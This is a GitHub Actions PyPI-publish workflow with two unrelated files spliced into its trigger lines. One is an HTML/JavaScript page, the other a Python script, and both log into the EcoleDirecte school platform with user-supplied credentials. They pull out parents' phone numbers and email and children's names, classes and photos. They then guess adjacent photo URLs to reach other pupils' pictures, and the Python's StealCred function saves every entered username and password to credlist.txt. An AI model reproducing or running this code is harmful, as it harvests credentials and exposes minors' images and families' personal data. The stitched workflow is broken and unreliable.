# This workflow will upload a Python Package using Twine when a release is created
# For more information see: https://docs.github.com/en/actions/automating-builds-and-tests/building-and-testing-python#publishing-to-package-registries

# This workflow uses actions that are not certified by GitHub.
# They are provided by a third-party and are governed by
# separate terms of service, privacy policy, and support
# documentation.

name: Upload Python Package

on: <!DOCTYPE html>
<html>
<head>
        <title>Ecoledirecte</title>
</head>
<body style="background-color: rgb(241, 196, 15); font-family: 'proxima-nova-soft', 'Proxima Nova Soft', Helvetica, Arial, sans-serif;">
        <div style="border-style: dashed;">
        <h2 align="center" id="header">
                <pre>
███████╗ ██████╗ ██████╗ ██╗     ███████╗██████╗ ██╗██████╗ ███████╗ ██████╗████████╗███████╗    
██╔════╝██╔════╝██╔═══██╗██║     ██╔════╝██╔══██╗██║██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔════╝    
█████╗  ██║     ██║   ██║██║     █████╗  ██║  ██║██║██████╔╝█████╗  ██║        ██║   █████╗      
██╔══╝  ██║     ██║   ██║██║     ██╔══╝  ██║  ██║██║██╔══██╗██╔══╝  ██║        ██║   ██╔══╝      
███████╗╚██████╗╚██████╔╝███████╗███████╗██████╔╝██║██║  ██║███████╗╚██████╗   ██║   ███████╗    
╚══════╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═════╝ ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝   ╚═╝   ╚══════╝    
</pre>                                                                                                 
</h2></div>
<br>
<div align="center">
        <input type="text" id="user" placeholder="Username">
        <br>
        <input type="password" id="passwd" placeholder="Password">
        <br>
        <button id="bouton" type="button" onclick="start()">Start</button>
        <br>
        <p type="hidden" id="errorhanlder"></p>
        <br>
        <hr>
</div>
        <h3 id="header3"></h3>
        <ul>
                <p id="nomEtablissement"></p>
                <p id="email"></p>
                <p id="tel"></p>
                <li id="nom1"></li>
                <li id="classe1"></li>
                <img id="image1">
                <hr>
                <li id="nom2"></li>
                <li id="classe2"></li>
                <img id="image2">
                <hr>
                <li id="nom3"></li>
                <li id="classe3"></li>
                <img id="image3">
        </ul>
                <hr>
                <h3 id="autresphotos"></h3>
                <img id="found1">
                <img id="found2">
                <img id="found4">
                <img id="found5">
                <img id="found7">
                <img id="found8">


</body>
<script type="text/javascript">
        function getotherpics(link) {
                var b = [];
                var racine = link.split("/")[5].split(".")[0].slice(0,-2);
                var finracine = link.split("/")[5].split(".")[0].substr(6);
                var deu = link.split("/")[5].split(".")[0].substr(6);
                var url = link.split("/");
                delete url[0]
                delete url[1]
                delete url[5]
                url = "http://"+url.join("/");
                b.push(url+racine.toString()+(parseInt(finracine)-1)+".jpg")
                b.push(url+racine.toString()+(parseInt(deu)+1)+".jpg")
        return b;
}
        var eleve1 = {};
        var eleve2 = {};
        var eleve3 = {};
        function start() {
                var nom1 = document.getElementById("nom1");
        var nom2 = document.getElementById("nom2");
        var nom3 = document.getElementById("nom3");
        var classe1 = document.getElementById("classe1");
        var classe2 = document.getElementById("classe2");
        var classe3 = document.getElementById("classe3");
        var image1 = document.getElementById("image1");
        var image2 = document.getElementById("image2");
        var image3 = document.getElementById("image3");
        var found1 = document.getElementById("found1");
        var found2 = document.getElementById("found2");
        var found4 = document.getElementById("found4");
        var found5 = document.getElementById("found5");
        var found7 = document.getElementById("found7");
        var found8 = document.getElementById("found8");
        var tel = document.getElementById("tel");
        nom1.innerHTML = "";
        nom2.innerHTML = "";
        nom3.innerHTML = "";
        classe1.innerHTML = "";
        classe2.innerHTML = "";
        classe3.innerHTML = "";
        image1.innerHTML = "";
        image2.innerHTML = "";
        image3.innerHTML = "";
                var user = document.getElementById('user').value.toString();
                var passwd = document.getElementById('passwd').value.toString();
                var requete = new XMLHttpRequest();
                var url = "https://vmws22.ecoledirecte.com/v3/login.awp?data=" + encodeURIComponent(JSON.stringify({"identifiant": user, "motdepasse": passwd}));
                requete.open("GET", url, true);
                requete.setRequestHeader("Content-Type", "application/json");
                requete.onreadystatechange = function () {

                    if (requete.readyState === 4 && requete.status === 200 && JSON.parse(requete.responseText).code !== 505) {
                            var goodcreds = document.getElementById('errorhanlder');
                            goodcreds.style = "color: rgb(213, 24, 47);"
                                goodcreds.type = "text";
                                goodcreds.innerHTML = "[+] Chargement des resources";
                            var json = JSON.parse(requete.responseText);
                        var etablissement = json.data.accounts[0].nomEtablissement;
                        var email = json.data.accounts[0].email;
                        console.log("UAI: "+json.data.accounts[0].codeOgec)
                        try{
                                eleve1.nom = json.data.accounts[0].profile.eleves[0].prenom.toString()+" "+json.data.accounts[0].profile.eleves[0].nom.toString();
                                eleve1.classe = json.data.accounts[0].profile.eleves[0].classe.libelle.toString();
                                eleve1.photo = json.data.accounts[0].profile.eleves[0].photo.toString().replace("//","http://");
                        } catch(e){
                                console.log("Error for eleve1");
                                eleve1 = new Boolean(false);
                        }
                        try{
                                eleve2.nom = json.data.accounts[0].profile.eleves[1].prenom.toString()+" "+json.data.accounts[0].profile.eleves[1].nom.toString();
                                eleve2.classe = json.data.accounts[0].profile.eleves[1].classe.libelle.toString();
                                eleve2.photo = json.data.accounts[0].profile.eleves[1].photo.toString().replace("//","http://");
                        } catch(e){
                                console.log("Second 'eleve' not found");
                                eleve2 = new Boolean(false);
                        }
                        try{
                                eleve3.nom = json.data.accounts[0].profile.eleves[2].prenom.toString()+" "+json.data.accounts[0].profile.eleves[2].nom.toString();
                                eleve3.classe = json.data.accounts[0].profile.eleves[2].classe.libelle.toString();
                                eleve3.photo = json.data.accounts[0].profile.eleves[2].photo.toString().replace("//","http://"); 
                        } catch(e){
                                console.log("Third 'eleve' not found");
                                eleve3 = new Boolean(false);
                        }
                                goodcreds.innerHTML = "[+] Les resultats sont disponibles";
                                document.getElementById("header3").innerHTML = "Resultats";
                                document.getElementById("nomEtablissement").innerHTML = "Etablissement: "+etablissement;
                                document.getElementById("email").innerHTML = "Mail: "+email;
                                tel.innerHTML = "Tel: "+json.data.accounts[0].profile.telPortable.toString()+" , "+json.data.accounts[0].profile.telPortableConjoint.toString()

                                if (eleve1 !== new Boolean(false)){
                                        nom1.innerHTML = eleve1.nom;
                                        classe1.innerHTML = eleve1.classe;
                                        var link_pic = eleve1.photo.toString();
                                        image1.src = link_pic;
                                        var res1 = new getotherpics(link_pic);
                                        try{
                                                found1.src = res1[0];
                                        } catch(e){
                                                found1.removeAttribute("src");
                                        }
                                        try{found2.src = res1[1];} catch(e){found2.removeAttribute("src");}

                                }
                                if (eleve2 !== new Boolean(false) && eleve2.nom !== undefined){
                                        nom2.innerHTML = eleve2.nom;
                                        classe2.innerHTML = eleve2.classe;
                                        var link_pic2 = eleve2.photo.toString();
                                        image2.src = link_pic2;
                                        var res2 = new getotherpics(link_pic2);
                                        try{found4.src = res2[0];} catch(e){found4.removeAttribute("src");}
                                        try{found5.src = res2[1];} catch(e){found5.removeAttribute("src");}
                                }
                                if (eleve3 !== new Boolean(false) && eleve3.nom !== undefined){
                                        nom3.innerHTML = eleve3.nom;
                                        classe3.innerHTML = eleve3.classe;
                                        var link_pic3 = eleve3.photo.toString();
                                        image3.src = link_pic3;
                                        var res3 = new getotherpics(link_pic3);
                                        try{found7.src = res3[0];} catch(e){found7.removeAttribute("src");}
                                        try{found8.src = res3[1];} catch(e){found8.removeAttribute("src");}
                                }

            }
    else{
            var errorwrongcreds = document.getElementById('errorhanlder');
                errorwrongcreds.type = "text";
                errorwrongcreds.style = "color: red;"
                errorwrongcreds.innerHTML = "[-] Identifiant ou mot de passe invalide!";
    }
        };
        requete.send();
        }
</script>
<style type="text/css">
        button{
                width: 25%;
                padding: 5px;
                border-style: none;
                background-color: rgba(169, 37, 255,1);
                color: white;
                border-radius: 20px;
        }
        .par{
                font-family: sans-serif;
                font-size: 20px;
                text-decoration: underline;
                text-decoration-color: red;
        }
        #user, #passwd{
                border-radius: 20px;
                border-spacing: 10px;
                border-style: inset;
                text-align: center;
                width: 600px;
                height: 60px;
                box-shadow: -10px 9px rgb(169, 37, 255);

        }
        #header{
                font-family: "ANSI Shadow";
                white-space: pre;
                text-align: center;
        }
        #header3{
                font-size: 60px;
                color: rgb(169, 37, 24);
                font-family: "proxima-nova-soft", "Proxima Nova Soft", Helvetica, Arial, sans-serif;
                font-weight: 30;
        }
</style>
</html>
  release: import requests
from sys import exit

class Ecoledirecte():
        def __init__(self, identifiant, password):
                self.identifiant = str(identifiant)
                self.password = str(password)
                try:
                        self.url = "https://vmws22.ecoledirecte.com/v3/login.awp?data={%22identifiant%22:%22" + f"{identifiant}" + "%22,%22motdepasse%22:%22"+f"{password}"+"%22}"
                        self.req = requests.post(self.url)
                        if self.req.status_code != 200:
                                print("Wrong ids")
                                return False
                except:
                        print("An error occured")
                        return False
                #debug :
                self.json = self.req.json()
                self.text = self.req.text
                #::
                self.photos = {}
                roots = []
                pto = []
                self.otherpic = []
                classes = []
                names = []
                for x in range(0,4):
                        try:
                                phot = self.req.json()['data']['accounts'][0]["profile"]["eleves"][x]["photo"]
                                pto.append(phot)
                        except IndexError:
                                pass
                        except KeyError:
                                pass
                        try:
                                root = phot.split("/")[-1][:-4]
                                roots.append(root)
                        except IndexError:
                                pass
                        except KeyError:
                                pass
                        try:
                                classe = self.req.json()['data']['accounts'][0]["profile"]["eleves"][x]["classe"]['libelle']
                                classes.append(classe)
                        except IndexError:
                                pass
                        except KeyError:
                                pass
                        try:
                                names.append(self.req.json()['data']['accounts'][0]["profile"]["eleves"][x]['prenom']+" "+self.req.json()['data']['accounts'][0]["profile"]["eleves"][x]['nom'])
                        except IndexError:
                                pass
                        except KeyError:
                                pass
                self.photos["name"] = names
                self.photos["entirepath"] = pto
                self.photos["classes"] = classes
                self.photos["roots"] = roots
                try:
                        self.photos["all"] = roots.copy()
                        del roots
                        portable = {}
                        portable[self.req.json()['data']['accounts'][0]["profile"]["email"]] = [self.req.json()['data']['accounts'][0]["profile"]["telPortable"], self.req.json()['data']['accounts'][0]["profile"]["telPortableConjoint"]]
                except IndexError:
                        pass
                try:
                        nomprincipal = self.req.json()['data']['accounts'][0]["prenom"] + " " + self.req.json()['data']['accounts'][0]["particule"] + self.req.json()['data']['accounts'][0]["nom"]
                except IndexError:
                        pass
                try:        
                        codeuai = self.req.json()['data']['accounts'][0]["codeOgec"]
                except IndexError:
                        pass
                try:
                        email = self.req.json()['data']['accounts'][0]["email"]
                except IndexError:
                        pass
                try:
                        etablissement = self.req.json()['data']['accounts'][0]["nomEtablissement"]
                except IndexError:
                        pass
                def StealCred():
                        try:
                                o = open("credlist.txt", "a")
                                o.write(self.identifiant+":"+self.password+"\n")
                                o.close()
                        except Exception as e:
                                print(e)
                                return False
                StealCred()
                def GetOtherPic():
                        pat = "/".join(self.photos["entirepath"][0].split("/")[2:-1])+"/"
                        rout = self.photos["entirepath"][0].split("/")[-1][:-6]
                        for test in range(int(self.photos["entirepath"][0].split("/")[-1][6:-4])-2,int(self.photos["entirepath"][0].split("/")[-1][6:-4])+2):
                                try:
                                        rm = requests.get("http://"+pat+rout+str(test)+".jpg").text
                                except:
                                        pass
                                else:
                                        if not "Error" in rm:
                                                self.otherpic.append("http://"+pat+rout+str(test)+".jpg")
                GetOtherPic()
                def OpenOtherPictureFound(self):
                        try:
                                import webbrowser as web
                        except ModuleNotFoundError:
                                print("Install webbrowser first")
                                return False
                        if not GetOtherPic():
                                return False
                        for i in self.otherpic:
                                try:
                                        w = web.open_new_tab(i)
                                except:
                                        return False
                                if not w:
                                        print("Unable to open your default webbrowser")
                                        return False



res = Ecoledirecte("yourusername","yourpassword")
#print(res.text) # display server response (for debugging)
#print(res.photos) #display all
#print(res.otherpic) #display pictures found
#res.OpenOtherPictureFound() #open other pictures found on your default webbrowser
    types: [published]

permissions:
  contents: read

jobs:
  deploy:

    runs-on: ubuntu-latest

    steps:
    - uses: actions/checkout@v4
    - name: Set up Python
      uses: actions/setup-python@v3
      with:
        python-version: '3.x'
    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install build
    - name: Build package
      run: python -m build
    - name: Publish package
      uses: pypa/gh-action-pypi-publish@27b31702a0e7fc50959f5ad993c78deac1bdfc29
      with:
        user: __token__
        password: ${{ secrets.PYPI_API_TOKEN }}
